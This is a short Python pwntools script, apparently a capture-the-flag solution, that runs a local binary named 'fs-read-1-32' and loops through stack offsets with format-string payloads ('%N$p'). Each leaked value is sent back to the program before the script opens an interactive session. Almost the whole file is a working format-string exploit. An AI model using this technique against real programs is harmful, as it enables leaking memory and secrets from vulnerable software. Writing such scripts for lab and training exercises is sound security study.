#!/usr/bin/env python

from pwn import *

i = 0

while True:
        p = process('./fs-read-1-32')
        buf = '%'
        buf += str(i)
        buf += '$p'
        p.recv()
        p.sendline(buf)
        item = p.readline()
        item = item[6:]
        p.sendline(item)
        p.interactive()
        p.close()
        i += 1